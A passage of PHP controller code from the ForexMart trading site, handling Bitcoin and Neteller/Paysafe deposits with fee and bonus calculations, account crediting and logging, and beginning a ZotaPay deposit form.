        header('Content-Type: text/plain');
        echo  $usd_amount = $this->bitcoinToUSD('btc', 13990000);
        exit();
        $usd_amount = $this->bitcoinToUSD('btc', 68764);
        $usd_amount_forwarded = $this->bitcoinToUSD('btc', 66352);

        $paymentGetwayData = [
            'order_id' => 'CRY201911270118256',
            'status' => 1,
             'input_transaction_hash' => '770d4ed35d95dcc066202750f7ec35bc5bd6ef613bf4e0462d6a65221e5a2885',
             'transaction_hash' => 'f045747528f24376d89fccc25858ee65ff65e92373e91d26f02768f0b0c450dd',
             'amount' => $usd_amount,
             'usd_amount_forwarded' => $usd_amount_forwarded,
            ];

        $this->cryptocurrencyDepositProcess($paymentGetwayData);
    }

    private function cryptocurrencyDepositProcess(array $paymentGetwayData)
    {
        if ($paymentGetwayData['amount'] > 0) {
            $paidAmount = $paymentGetwayData['amount'];

            if ($row = $this->general_model->where('cryptocurrency', ['order_id' => $paymentGetwayData['order_id'], 'status' => 0])) {
                $invData = $row->row_array();

                if (true) {
                    $accData = $this->general_model->whereConditionQuery($invData['user_id']);
                    $amount = $paidAmount;
                    $total_amount = $this->get_convert_amount('USD', $amount, $accData['currency']);
                    $amount = $this->get_convert_amount('USD', $amount, $accData['currency']);

                    $currency = $accData['currency'];
                    /* FXPP-6333 */
                    $currencyStatus = $this->currency_status[$currency];
                    $isMicro = $this->account_model->isMicro($invData['user_id']);
                    if ($paymentGetwayData['usd_amount_forwarded'] > 0) {
                        $fee = ($paymentGetwayData['amount'] - $paymentGetwayData['usd_amount_forwarded']);
                        $fee = $this->get_convert_amount('USD', $fee, $accData['currency']);
                    }

                    if ($isMicro) {
                        $amount *= 100;
                        $fee *= 100;
                        $total_amount *= 100;
                        $currencyStatus = $this->currency_status['Cents'];
                    }
                    /* FXPP-6333 */

                    $bonus = $amount * 0.30;
                    $conv_amount_fee_usd = $this->get_convert_amount($accData['currency'], $fee);
                    $conv_amount_bonus_usd = $this->get_convert_amount($accData['currency'], $bonus);
                    $amount -= $fee;

                    $conv_amount = $amount;
                    $conv_amount_fee = $fee;
                    $conv_amount_bonus = $bonus;
                    $conv_amount_usd = $this->get_convert_amount($accData['currency'], $amount);

                    $insertDepositFailed = [
                        'transaction_id	' => $invData['order_id'],
                        'status	' => 0,
                        'amount	' => $amount,
                        'currency' => $currency,
                        'user_id' => $invData['user_id'],
                        'payment_date' => date('Y-m-d H:i:s', strtotime(FXPP::getCurrentDateTime())),
                        'transaction_type' => 'BITCOIN',
                        'payment_status' => $this->paymentType_status['Deposit via Bitcoin'], //FXPP-7618
                        'currency_status' => $currencyStatus, //FXPP-7618
                        'fee' => $fee,
                        'isFailed' => 0,
                        'type' => 'deposit-'.$isMicro.'-'.$invData['bonus'],
                    ];

                    $data = [
                        'transaction_id' => $invData['order_id'],
                        'reference_id' => $paymentGetwayData['order_id'],
                        'status' => 2,
                        'amount' => $amount,
                        'currency' => $currency,
                        'user_id' => $invData['user_id'],
                        'payment_date' => date('Y-m-d H:i:s', strtotime(FXPP::getCurrentDateTime())),
                        'note' => 'BITCOIN deposit',
                        'transaction_type' => 'BITCOIN',
                        'conv_amount' => $conv_amount_usd,
                        'payment_status' => $this->paymentType_status['Deposit via Bitcoin'], //FXPP-7618
                        'currency_status' => $currencyStatus, //FXPP-7618
                    ];

                    if ($fee > 0) {
                        $data_fee = [
                            'transaction_id' => $invData['order_id'],
                            'reference_id' => $paymentGetwayData['order_id'],
                            'status' => 2,
                            'amount' => $fee,
                            'currency' => $currency,
                            'user_id' => $invData['user_id'],
                            'payment_date' => date('Y-m-d H:i:s', strtotime(FXPP::getCurrentDateTime())),
                            'note' => 'BITCOIN deposit',
                            'transaction_type' => 'BITCOIN',
                            'conv_amount' => $conv_amount_fee_usd,
                            'payment_status' => $this->paymentType_status['Deposit via Bitcoin'], //FXPP-7618
                            'currency_status' => $currencyStatus, //FXPP-7618
                        ];
                    }

                    $config = [
                        'server' => 'live_new',
                    ];
//                    $WebService = new WebService($config);

                    $account_number = $accData['account_number'];

                    // if(IPLoc::APIUpgradeDevIP()){
                    $WebServiceNew = FXPP::DepositRealFund($account_number, $conv_amount, $this->comment_type['deposit'].$this->comment_transaction_type['BITCOIN'].$invData['order_id']);
                    $requestResult = $WebServiceNew['requestResult'];
                    $ticket = $WebServiceNew['ticket'];
                    /*}else{
                        $WebService->update_live_deposit_balance($account_number, $conv_amount, $this->comment_type['deposit'] . $this->comment_transaction_type['BITCOIN'] . $invData['order_id']);
                        $requestResult = $WebService->request_status;
                        $ticket        = $WebService->get_result('Ticket');
                    }*/

                    if ($requestResult === 'RET_OK') {
                        $data['mt_ticket'] = $ticket;

                        // Back Agent of Client
                        //FXPP::BackAgentOfAccount($account_number);
                    } else {
                        $insertDepositFailed['comment'] = $requestResult;
                        $this->general_model->insert('no_status_transaction', $insertDepositFailed);
                    }

                    if ($fee > 0) {
//                        $WebService = new WebService($config);
                        $account_number = $accData['account_number'];

                        //if(IPLoc::APIUpgradeDevIP()){
                        $WebServiceNew = FXPP::DepositRealFund($account_number, $conv_amount_fee, $this->comment_type['deposit_fee'].$this->comment_transaction_type['BITCOIN'].$invData['order_id']);
                        $requestResult = $WebServiceNew['requestResult'];
                        $ticket = $WebServiceNew['ticket'];
                        /* }else{
                             $WebService->update_live_deposit_balance($account_number, $conv_amount_fee, $this->comment_type['deposit_fee'] . $this->comment_transaction_type['BITCOIN'] . $invData['order_id']);
                             $requestResult = $WebService->request_status;
                             $ticket        = $WebService->get_result('Ticket');
                         }*/

                        if ($requestResult === 'RET_OK') {
                            $data_fee['mt_ticket'] = $ticket;
                        } else {
                            $insertDepositFailed['comment'] = $requestResult;
                            $this->general_model->insert('no_status_transaction', $insertDepositFailed);
                        }
                    }

                    $this->SetAccountAgentPotentialFund($account_number);

                    $deposit_id = $this->deposit_model->insertPayment($data);
                    if ($fee > 0) {
                        $this->deposit_model->insertPayment($data_fee);
                    }

                    $updateData = ['status' => 1,
                    'input_transaction_hash' => $paymentGetwayData['input_transaction_hash'],
                    'transaction_hash' => $paymentGetwayData['transaction_hash'],
                    'amount' => $paymentGetwayData['amount'],
                ];
                    $this->general_model->updatemy('cryptocurrency', 'order_id', $paymentGetwayData['order_id'], $updateData);

//                    FXPP::updateAccountTradingStatus($account_number,$invData['user_id']); // for pro accounts

                    /* if(IPLoc::APIUpgradeDevIP()){
                          FXPP::updateAccountTradingStatusV2($account_number,$invData['user_id']); // for pro accounts
                      }else{*/
                    FXPP::updateAccountTradingStatus($account_number, $invData['user_id']); // for pro accounts
                    // }

                    /* ========================================== Welcome bonus================================================ **/

//                    if ($invData['bonus'] == 'twpb') {
//                        // $this->deposit_20PercentBonus($account_number,$bonus);  // FOREXMART WELCOME BONUS 20%
//                        FXPP::DepositBonus($invData['user_id'], $account_number, $total_amount, 'BITCOIN', 'twpb', $data['transaction_id']);
//                    }
//
//                    if ($invData['bonus'] == 'tpb') {
//                        // $this->deposit_30PercentBonus($account_number,$bonus);  // FOREXMART WELCOME BONUS 30%
//                        FXPP::DepositBonus($invData['user_id'], $account_number, $total_amount, 'BITCOIN', 'tpb', $data['transaction_id']);
//                    }
//                    if ($invData['bonus'] == 'fpb') {
//                        // $this->deposit_30PercentBonus($account_number,$bonus);  // FOREXMART WELCOME BONUS 50%
//                        FXPP::DepositBonus($invData['user_id'], $account_number, $total_amount, 'BITCOIN', 'fpb', $data['transaction_id']);
//                    }
//
//                    if ($invData['bonus'] == 'hpb') {
//                        // $this->deposit_30PercentBonus($account_number,$bonus);  // FOREXMART limited 100%  BONUS
//                        FXPP::Deposit100PercentBonus($invData['user_id'], $account_number, $total_amount, 'BITCOIN', 'hplb', $data['transaction_id']);
//                    }
//
//                    if (IPLoc::Office()) {
//                        if ($invData['bonus'] == 'rhpb') {
//                            FXPP::DepositRegular100PercentBonus($invData['user_id'], $account_number, $total_amount, 'BITCOIN', 'rhpb', $data['transaction_id']);
//                        }
//                    }
//
//                    if ($invData['additional_tenp_bonus'] == 1) {
//                        // $this->deposit_20PercentBonus($account_number,$bonus);  // FOREXMART WELCOME BONUS 10%
//                        FXPP::DepositBonus($invData['user_id'], $account_number, $total_amount, 'BITCOIN', 'tenpb', $data['transaction_id']);
//                    }

                    self::applyDepositBonus($invData['user_id'], $account_number, $total_amount, 'BITCOIN', $invData['bonus'], $data['transaction_id'], false);

                    if ($invData['additional_tenp_bonus'] == 1) {
                        self::applyDepositBonus($invData['user_id'], $account_number, $total_amount, 'BITCOIN', 'tenpb', $data['transaction_id'], true);
                    }

                    $bonuses = FXPP::getAccountBonusByType($account_number);
                    $qiwi_amount = $paidAmount;
                    $RequestLogintype = $this->account_model->getAccountLoginType($invData['user_id']);
                    if ($RequestLogintype['login_type'] != 1) {
                        if ($qiwi_amount > 0 and $bonuses[2] > 0) {
                            FXPP::BonusProfitCancellation($invData['user_id'], $account_number, $qiwi_amount, $data['transaction_id']);
                        }
                    }

                    // Bonus Profit Logs**/
                    $ndbProfitLogs = [
                        'Account_number' => $account_number,
                        'DepAmount' => $paidAmount,
                        'UserId' => $invData['user_id'],
                        'TransactionId' => $data['transaction_id'],
                        'ndbbonus' => $bonuses[2],
                    ];
                    $encodeNdbProfitLogs = json_encode($ndbProfitLogs);
                    $insertProfitLogs = [
                        'logs' => $encodeNdbProfitLogs,
                        'User_Id' => $invData['user_id'],
                    ];

                    $this->deposit_model->insertNdbCancellationLogs($insertProfitLogs);

                    /**=========================================== Welcome bonus end ====================================================**/

                    /**  Use original amount for Cent accounts**/
                    $isMicro = $this->account_model->isMicro($invData['user_id']);
                    $processed_amount = floatval($conv_amount_usd) + floatval($conv_amount_fee_usd);
                    if ($isMicro) {
                        $processed_amount /= 100;
                    }
                    /* End **/
                    /* Send successful email deposit to auto-reports **/
                    $this->sendEmailAfterSuccessDeposit('BITCOIN', $processed_amount, $account_number, $invData['user_id'], $this->comment_type['deposit'].$this->comment_transaction_type['BITCOIN'].$invData['order_id']);
                    /* End **/
                }
            }
        } else {
            $updateData = ['status' => 2];
            $this->general_model->updatemy('cryptocurrency', 'order_id', $paymentGetwayData['order_id'], $updateData);
        }
    }

    public function paysafe_status()
    {
        $data = json_decode(file_get_contents('php://input'), true);
        $insertData = ['log' => $data['payload']['merchantRefNum'].'|'.serialize($data), 'ip' => $this->input->ip_address()];
        $this->general_model->insertmy('paysafe_log', $insertData);

        if (isset($data['payload']['merchantRefNum'])) {
            $merchantRefNum = $data['payload']['merchantRefNum'];
            $this->load->library('neteller');
            $this->neteller->merchantRefNum = $merchantRefNum;
            $response = $this->neteller->getPaymentHandleByMerchant();

            $paymentGetwayData = [
            'order_id' => $response->paymentHandles[0]->merchantRefNum,
            'status' => 1,
             'amount' => $response->paymentHandles[0]->amount,
             'currencyCode' => $response->paymentHandles[0]->currencyCode,
            ];

            if ($response->paymentHandles[0]->status == 'PAYABLE') {
                $this->neteller->amount = $response->paymentHandles[0]->amount;
                $this->neteller->currencyCode = $response->paymentHandles[0]->currencyCode;
                $this->neteller->paymentHandleToken = $response->paymentHandles[0]->paymentHandleToken;
                $response = $this->neteller->processPayment();
                $this->paysafeDepositProcess($paymentGetwayData);
            }
        }
    }

    public function paysafe_completed()
    {
        if (isset($_GET['ref'])) {
            $this->session->set_flashdata('paysafe_completed', 'The payment has been completed. ');
            $merchantRefNum = $_GET['ref'];

            $this->load->library('neteller');
            $this->neteller->merchantRefNum = $merchantRefNum;
            $response = $this->neteller->getPaymentHandleByMerchant();

            $paymentGetwayData = [
            'order_id' => $response->paymentHandles[0]->merchantRefNum,
            'status' => 1,
             'amount' => $response->paymentHandles[0]->amount,
             'currencyCode' => $response->paymentHandles[0]->currencyCode,
            ];

            if ($response->paymentHandles[0]->status == 'PAYABLE') {
                $this->neteller->amount = $response->paymentHandles[0]->amount;
                $this->neteller->currencyCode = $response->paymentHandles[0]->currencyCode;
                $this->neteller->paymentHandleToken = $response->paymentHandles[0]->paymentHandleToken;
                $response = $this->neteller->processPayment();

                $this->paysafeDepositProcess($paymentGetwayData);

                redirect('deposit/neteller');
            }
        }

        redirect('deposit/neteller');
    }

       
    
    private function paysafeDepositProcess(array $paymentGetwayData)
    {
        if ($paymentGetwayData['amount'] > 0) {
            $paidAmount = $paymentGetwayData['amount'] / 100;

            if ($row = $this->general_model->where('neteller_paysafe', ['order_id' => $paymentGetwayData['order_id'], 'status' => 0])) {
                $this->general_model->updatemy('neteller_paysafe', 'order_id', $paymentGetwayData['order_id'], ['status' => 1]);
                $invData = $row->row_array();

                if (true) {
                    $accData = $this->general_model->whereConditionQuery($invData['user_id']);
                    $amount = $paidAmount;
                    $total_amount = $this->get_convert_amount($paymentGetwayData['currencyCode'], $amount, $accData['currency']);
                    $amount = $total_amount;

                    $currency = $accData['currency'];
                    /* FXPP-6333 */
                    $currencyStatus = $this->currency_status[$currency];
                    $isMicro = $this->account_model->isMicro($invData['user_id']);

                    
                    $fee = 0;
                    
                    
                    //58080480 IP 138.201.153.118
                    	$user_ip=$this->input->ip_address();
                        $specail_account="58080480";
                    
                   if(IPLoc::Office() or $user_ip=="138.201.153.118" or  $accData['account_number']==$specail_account){ 
                    
                    /*----------------------fee add------------FXPP-13766------------------------*/
                    
                    $user_profiles = $this->general_model->getUserProfiles($invData['user_id']);                    
                    $client_country_code=($user_profiles)?($user_profiles->country)?$user_profiles->country:false:false;
                    
                            $default_amt_usd=0.29; 
                            $each_transection_client_currency_default_charge_amt=0; 
                            $each_transection_client_currency_charge_amt=0;
                            $each_transection_client_currency_additional_charge_amt=0;   
                             $one_to_client_currency_amt=$this->get_convert_amount("USD", 1, $accData['currency']);        

                             # condition-1
                             $each_transection_client_currency_default_charge_amt=$this->get_convert_amount("USD", $default_amt_usd, $accData['currency']);


                             # condition-2
                             $each_transection_client_currency_percent=6.4;
                                    $each_transection_client_currency_charge_amt=(($amount*$each_transection_client_currency_percent)/100);
                                    $each_transection_client_currency_usd_amt=$this->get_convert_amount($accData['currency'], $each_transection_client_currency_charge_amt,"USD");
                                    if($each_transection_client_currency_usd_amt<1)
                                    {
                                        $each_transection_client_currency_charge_amt=$one_to_client_currency_amt;
                                    }

                           # condition-3         
                          if(FXPP::depositFeeAllowCountry($client_country_code)){      

                             $each_transection_client_currency_additional_percent=1;
                                    $each_transection_client_currency_additional_charge_amt=(($amount*$each_transection_client_currency_additional_percent)/100);

                          }


                        $fee=($each_transection_client_currency_default_charge_amt+$each_transection_client_currency_charge_amt+$each_transection_client_currency_additional_charge_amt); 
                    
                    /*----------------------fee add code close------------------------------------*/
                   }

                    if ($isMicro) {
                        $amount *= 100;
                        $fee *= 100;
                        $total_amount *= 100;
                        $currencyStatus = $this->currency_status['Cents'];
                    }
                    /* FXPP-6333 */

                    $bonus = $amount * 0.30;
                    $conv_amount_fee_usd = $this->get_convert_amount($accData['currency'], $fee);
                    $conv_amount_bonus_usd = $this->get_convert_amount($accData['currency'], $bonus);
                    $amount -= $fee;

                    $conv_amount = $amount;
                    $conv_amount_fee = $fee;
                    $conv_amount_bonus = $bonus;
                    $conv_amount_usd = $this->get_convert_amount($accData['currency'], $amount);

                    $payment_status = $this->paymentType_status['Deposit via Neteller'];

                    $insertDepositFailed = [
                        'transaction_id	' => $invData['order_id'],
                        'status	' => 0,
                        'amount	' => $amount,
                        'currency' => $currency,
                        'user_id' => $invData['user_id'],
                        'payment_date' => date('Y-m-d H:i:s', strtotime(FXPP::getCurrentDateTime())),
                        'transaction_type' => 'NETELLER',
                        'payment_status' => $payment_status, //FXPP-7618
                        'currency_status' => $currencyStatus, //FXPP-7618
                        'fee' => $fee,
                        'isFailed' => 0,
                        'type' => 'deposit-'.$isMicro.'-'.$invData['bonus'],
                    ];

                    $data = [
                        'transaction_id' => $invData['order_id'],
                        'reference_id' => $paymentGetwayData['order_id'],
                        'status' => 2,
                        'amount' => $amount,
                        'currency' => $currency,
                        'user_id' => $invData['user_id'],
                        'payment_date' => date('Y-m-d H:i:s', strtotime(FXPP::getCurrentDateTime())),
                        'note' => 'NETELLER deposit',
                        'transaction_type' => 'NETELLER',
                        'conv_amount' => $conv_amount_usd,
                        'payment_status' => $payment_status, //FXPP-7618
                        'currency_status' => $currencyStatus, //FXPP-7618
                    ];

                    if ($fee > 0) {
                        $data_fee = [
                            'transaction_id' => $invData['order_id'],
                            'reference_id' => $paymentGetwayData['order_id'],
                            'status' => 2,
                            'amount' => $fee,
                            'currency' => $currency,
                            'user_id' => $invData['user_id'],
                            'payment_date' => date('Y-m-d H:i:s', strtotime(FXPP::getCurrentDateTime())),
                            'note' => 'NETELLER deposit',
                            'transaction_type' => 'NETELLER',
                            'conv_amount' => $conv_amount_fee_usd,
                            'payment_status' => $payment_status, //FXPP-7618
                            'currency_status' => $currencyStatus, //FXPP-7618
                        ];
                    }

                    
                    
                    
                    
                    
                    
                    $config = [
                        'server' => 'live_new',
                    ];
//                    $WebService = new WebService($config);

                    $account_number = $accData['account_number'];

                    // if(IPLoc::APIUpgradeDevIP()){
                    $WebService = FXPP::DepositRealFund($account_number, $conv_amount, $this->comment_type['deposit'].$this->comment_transaction_type['NETELLER'].$invData['order_id']);
                    $requestResult = $WebService['requestResult'];
                    $ticket = $WebService['ticket'];
                    /* }else{
                         $WebService->update_live_deposit_balance($account_number, $conv_amount, $this->comment_type['deposit'] . $this->comment_transaction_type['NETELLER'] . $invData['order_id']);
                         $requestResult = $WebService->request_status;
                         $ticket        = $WebService->get_result('Ticket');
                     }*/

                    if ($requestResult === 'RET_OK') {
                        $data['mt_ticket'] = $ticket;

                        // Back Agent of Client
                        //FXPP::BackAgentOfAccount($account_number);
                    } else {
                        $insertDepositFailed['comment'] = $requestResult;
                        $this->general_model->insert('no_status_transaction', $insertDepositFailed);
                        $this->general_model->updatemy('neteller_paysafe', 'order_id', $paymentGetwayData['order_id'], ['status' => 0]);
                    }

                    if ($fee > 0) {
//                        $WebService = new WebService($config);
                        $account_number = $accData['account_number'];

                        //if(IPLoc::APIUpgradeDevIP()){
                        $WebServiceNew = FXPP::DepositRealFund($account_number, $conv_amount_fee, $this->comment_type['deposit'].$this->comment_transaction_type['NETELLER'].$invData['order_id']);
                        $requestResult = $WebServiceNew['requestResult'];
                        $ticket = $WebServiceNew['ticket'];
                        /* }else{
                             $WebService->update_live_deposit_balance($account_number, $conv_amount_fee, $this->comment_type['deposit'] . $this->comment_transaction_type['NETELLER'] . $invData['order_id']);
                             $requestResult = $WebService->request_status;
                             $ticket        = $WebService->get_result('Ticket');
                         }*/

                        if ($requestResult === 'RET_OK') {
                            $data_fee['mt_ticket'] = $ticket;
                        } else {
                            $insertDepositFailed['comment'] = $requestResult;
                            $this->general_model->insert('no_status_transaction', $insertDepositFailed);
                        }
                    }

                    $this->SetAccountAgentPotentialFund($account_number);

                    $deposit_id = $this->deposit_model->insertPayment($data);
                    if ($fee > 0) {
                        $this->deposit_model->insertPayment($data_fee);
                    }

//                    FXPP::updateAccountTradingStatus($account_number,$invData['user_id']); // for pro accounts

                    /*if(IPLoc::APIUpgradeDevIP()){
                        FXPP::updateAccountTradingStatusV2($account_number,$invData['user_id']); // for pro accounts
                    }else{*/
                    FXPP::updateAccountTradingStatus($account_number, $invData['user_id']); // for pro accounts
                    //}

                    /* ========================================== Welcome bonus================================================ **/

//                    if ($invData['bonus'] == 'twpb') {
//                        // $this->deposit_20PercentBonus($account_number,$bonus);  // FOREXMART WELCOME BONUS 20%
//                        FXPP::DepositBonus($invData['user_id'], $account_number, $total_amount, 'NETELLER', 'twpb', $data['transaction_id']);
//                    }
//
//                    if ($invData['bonus'] == 'tpb') {
//                        // $this->deposit_30PercentBonus($account_number,$bonus);  // FOREXMART WELCOME BONUS 30%
//                        FXPP::DepositBonus($invData['user_id'], $account_number, $total_amount, 'NETELLER', 'tpb', $data['transaction_id']);
//                    }
//                    if ($invData['bonus'] == 'fpb') {
//                        // $this->deposit_30PercentBonus($account_number,$bonus);  // FOREXMART WELCOME BONUS 50%
//                        FXPP::DepositBonus($invData['user_id'], $account_number, $total_amount, 'NETELLER', 'fpb', $data['transaction_id']);
//                    }
//
//                    if ($invData['bonus'] == 'hpb') {
//                        // $this->deposit_30PercentBonus($account_number,$bonus);  // FOREXMART limited 100%  BONUS
//                        FXPP::Deposit100PercentBonus($invData['user_id'], $account_number, $total_amount, 'NETELLER', 'hplb', $data['transaction_id']);
//                    }
//
//                    if (IPLoc::Office()) {
//                        if ($invData['bonus'] == 'rhpb') {
//                            FXPP::DepositRegular100PercentBonus($invData['user_id'], $account_number, $total_amount, 'NETELLER', 'rhpb', $data['transaction_id']);
//                        }
//                    }
//
//                    if ($invData['additional_tenp_bonus'] == 1) {
//                        // $this->deposit_20PercentBonus($account_number,$bonus);  // FOREXMART WELCOME BONUS 10%
//                        FXPP::DepositBonus($invData['user_id'], $account_number, $total_amount, 'NETELLER', 'tenpb', $data['transaction_id']);
//                    }

                    self::applyDepositBonus($invData['user_id'], $account_number, $total_amount, 'NETELLER', $invData['bonus'], $data['transaction_id'], false);

                    if ($invData['additional_tenp_bonus'] == 1) {
                        self::applyDepositBonus($invData['user_id'], $account_number, $total_amount, 'NETELLER', 'tenpb', $data['transaction_id'], true);
                    }

                    $bonuses = FXPP::getAccountBonusByType($account_number);
                    $qiwi_amount = $paidAmount;
                    $RequestLogintype = $this->account_model->getAccountLoginType($invData['user_id']);
                    if ($RequestLogintype['login_type'] != 1) {
                        if ($qiwi_amount > 0 and $bonuses[2] > 0) {
                            FXPP::BonusProfitCancellation($invData['user_id'], $account_number, $qiwi_amount, $data['transaction_id']);
                        }
                    }

                    // Bonus Profit Logs**/
                    $ndbProfitLogs = [
                        'Account_number' => $account_number,
                        'DepAmount' => $paidAmount,
                        'UserId' => $invData['user_id'],
                        'TransactionId' => $data['transaction_id'],
                        'ndbbonus' => $bonuses[2],
                    ];
                    $encodeNdbProfitLogs = json_encode($ndbProfitLogs);
                    $insertProfitLogs = [
                        'logs' => $encodeNdbProfitLogs,
                        'User_Id' => $invData['user_id'],
                    ];

                    $this->deposit_model->insertNdbCancellationLogs($insertProfitLogs);

                    /**=========================================== Welcome bonus end ====================================================**/

                    /**  Use original amount for Cent accounts**/
                    $isMicro = $this->account_model->isMicro($invData['user_id']);
                    $processed_amount = floatval($conv_amount_usd) + floatval($conv_amount_fee_usd);
                    if ($isMicro) {
                        $processed_amount /= 100;
                    }
                    /* End **/
                    /* Send successful email deposit to auto-reports **/
                    $this->sendEmailAfterSuccessDeposit('NETELLER', $processed_amount, $account_number, $invData['user_id'], $this->comment_type['deposit'].$this->comment_transaction_type['NETELLER'].$invData['order_id']);
                    /* End **/
                }
            }
        } else {
            $updateData = ['status' => 2];
            $this->general_model->updatemy('neteller_paysafe', 'order_id', $paymentGetwayData['order_id'], $updateData);
        }
    }

    public function neteller()
    {
        if ($this->session->userdata('logged')) {
            if (FXPP::isEUClient()) {
                redirect('deposit');
            }
            // FXPP::LoginTypeRestriction();
            $userAccountCurrencyBase = FXPP::getCustomUserAccountCurrencyBase();
            $data['option'] = $this->general_model->selectOptionList($userAccountCurrencyBase);
            $data['amount'] = $this->input->post_get('amount1', true);

            if ($this->session->userdata('login_type') == 1) {
                $getCur = $this->partners_model->getAccountByUserId($this->session->userdata('user_id'));
                $currency_conv = $getCur['currency'];
                $acc_number = $getCur['reference_num'];
            } else {
                $getCur = $this->account_model->getAccountByUserId($this->session->userdata('user_id'));
                $currency_conv = $getCur['mt_currency_base'];
                $acc_number = $getCur['account_number'];
            }

            $field_value = '';
            if ($_POST) {
                $field_value = [
                    'amount' => $this->input->post('amount'),
                    'neteller_account' => $this->input->post('neteller_account'),
                ];
            }

            //  if ($data['amount'] == null) {
            $this->form_validation->set_rules('amount', 'Amount', "trim|required|deposit_min_amount2[$currency_conv]");
            $this->form_validation->set_rules('account_number', 'Currency', 'trim|required|xss_clean');
            $this->form_validation->set_rules('neteller_account', 'Account Email', 'trim|required|xss_clean');

            // }

            $error = '';
            $message = '';
            $field = '';
            $showModalOnLoad = false;
            $details = '';
            $showForm = 'nt-tab1';

            $data['error_msg'] = $this->updated_deposit_validation($this->session->userdata('user_id'));

            if ($this->form_validation->run() && !$data['error_msg']) {
                $this->load->library('neteller');

                $this->neteller->merchantRefNum = 'NT'.time().rand(10, 99);
                $this->neteller->amount = $this->input->post('amount', true) * 100;
                $this->neteller->currencyCode = $currency_conv;
                $this->neteller->customer_id = $this->input->post('neteller_account', true);

                try {
                    $response = $this->neteller->createPaymentHandle();

                    $additional_bonus = $this->validateAdditionalBonus($_GET['addBonus']);

                    $insertData = [
                    'paysafe_id' => $response->id,
                    'order_id' => $response->merchantRefNum,
                    'bonus' => $_GET['bonus'],
                    'create_date' => date('Y-m-d h:i:s'),
                    'user_id' => $this->session->userdata('user_id'),
                    'paymentHandleToken' => $response->paymentHandleToken,
                    'amount' => $response->amount,
                    'additional_tenp_bonus' => $additional_bonus,
                ];
 
                    if ($insertData['order_id'] != '') {
                        $this->general_model->insert('neteller_paysafe', $insertData);

                        redirect($response->links[0]->href);
                    } else {
                        $this->session->set_userdata(['incorrect_account' => 'Enter the correct NETELLER Account ID or E-mail Address!', 'data' => $field_value]);

                        redirect(current_url().'?'.$_SERVER['QUERY_STRING']);
                    }
                } catch (\Throwable $th) {
                }
            }

            if ($this->session->userdata('login_type') == 1) {
                $user_status = $this->partners_model->getAccountStatus($this->session->userdata('user_id'));
            } else {
                $user_status = $this->account_model->getAccountStatus($this->session->userdata('user_id'));
            }
            $data['incomplete'] = $this->account_model->incompleteRegistration($this->session->userdata('user_id'));

            //  $data['user_status'] = $user_status;
            $data['non_verified_notice'] = (!$user_status) ? $this->non_verified_notice() : false;
            $data['disabled'] = !$data['error_msg'] ? '' : 'disabled';

            $data['metadata_description'] = 'Provide the necessary information to deposit via Neteller. Request is processed within 24 hours.';

            $account = $this->account_model->getAccountNumber($this->session->userdata('user_id'));

            $data['field_value'] = $field_value;
            $data['account'] = $account;
            $data['input_account_number'] = FXPP::inputAccountNumberWithBalance2($account['account_number'], $account['currency']);

            $isMicro = $this->account_model->isMicro($this->session->userdata('user_id'));
            if ($isMicro) {
                $data['micro'] = 1;
            }

            $AcceptRiskDoc = $this->account_model->getRegistrationIP($this->session->userdata('user_id'));
            $data['RegCountry'] = IPLoc::getCountryCodeFromIP($AcceptRiskDoc);

            $js = $this->template->Js();
            $addjs = '<script>'.
                "var error = '$error',".
                "message = '$message',".
                "field = '$field',".
                'details = '.json_encode($details).','.
                "showModal = '$showModalOnLoad';".
                "var showForm = '$showForm';".
                "var showForm1 = '$showForm1';".
                '</script>'.
                "<script src='".$js."custom-neteller.js'></script>".
                "<script src='".$js."custom-deposit.js'></script>";
            $this->template->title('ForexMart | Deposit - Neteller')
                ->set_layout('internal/main')
                ->prepend_metadata($addjs)
                ->build('deposits/neteller_v2', $data);
        } else {
            redirect('signout');
        }
    }

    public function zotapay()
    {

      /*  if (IPLoc::IPOnlyForVenus() || $_SERVER['REMOTE_ADDR'] == '95.217.153.171' || $this->session->userdata('account_number') == '58071244') {

        }else{
            redirect('deposit/');
        }

        */

       
        if ($this->session->userdata('logged')) {

           
            
            if (!FXPP::isZotapayPayMentAvailable()) {show_404('accessing');}
           
            $data['type'] = $this->input->get('type', true);

            if ($data['type'] != 'cc') {
                $data['wallet_id'] = $this->input->get('wallet_id', true);
                if (empty($data['wallet_id'])) {
                    switch ($this->session->userdata('country')) {
                        case 'MY': $data['wallet_id'] = 'MYR'; break;
                        case 'ID': $data['wallet_id'] = 'IDR'; break;
                        case 'VN': $data['wallet_id'] = 'VND'; break;
                        case 'TH': $data['wallet_id'] = 'THB'; break;
                    }
                }
            }else{
                show_404('accessing');
            }

            

            $accountNumber = $this->session->userdata('account_number');

            $data['amount'] = $this->input->post_get('amount1', true);

            if ($this->input->post('payment_type', true) == 'CC') {
                $walletCurrency = $this->input->post('currency', true).'-'.'CC';
                if (IPLoc::IPOnlyForVenus() || $_SERVER['REMOTE_ADDR'] == '95.217.153.171' || $accountNumber == '58071244') {
                    $this->form_validation->set_rules('card_number', 'Card Number', 'trim|required');
                   
                    $field_value = '';
                    if ($_POST) {
                        $field_value = [
                            'from_card_number' => $this->input->post('card_number', true),
                            'amount' => $this->input->post('amount', true),
                        ];
                    }
                 }
                

            } else {
                $walletCurrency = $this->input->post('currency', true).'-'.$this->input->post('banks', true);
            }

            $data['bounusfiled'] = $this->input->get('bonus', true);
            $userId = $this->session->userdata('user_id');

            $this->form_validation->set_rules('amount', 'Amount', "trim|required|non_usd_min_amt_validate_zp[$walletCurrency]");
            $this->form_validation->set_rules('currency', 'Currency', 'trim|required|xss_clean');
            $this->form_validation->set_rules('first_name', 'First name', 'trim|required|chkNameValid');
            $this->form_validation->set_rules('last_name', 'Last name', 'trim|required');
            $this->form_validation->set_rules('phone_number', 'Phone number', 'trim|required|chkTelephoneValid');
            $this->form_validation->set_rules('address', 'Address', 'trim|required|chkAddressValid');
            $this->form_validation->set_rules('city', 'City', 'trim|required|chkCityValid');
            $this->form_validation->set_rules('state', 'State', 'trim');
            $this->form_validation->set_rules('zip', 'Zip code', 'trim|required|chkzip_codeValid');
            $profile = $this->general_model->showssingle($table = 'user_profiles', 'user_id', $userId, 'full_name,country,street,state,zip,city');
            $phone_num = $this->general_model->showssingle($table = 'contacts', 'user_id', $userId, 'phone1');

            $full_name = explode(' ', $profile['full_name']);
            $data['first_name'] = $full_name[0];
            $data['last_name'] = $full_name[1];
            $data['phone_number'] = $phone_num['phone1'];
            $data['address'] = $profile['street'];
            $data['state'] = $profile['state'];
            $data['city'] = $profile['city'];
            $data['zip'] = $profile['zip'];

            $data['error_msg'] = $this->updated_deposit_validation($this->session->userdata('user_id'));

            if ($this->form_validation->run() && !$data['error_msg']) {
                $this->load->library('ZotaPay');

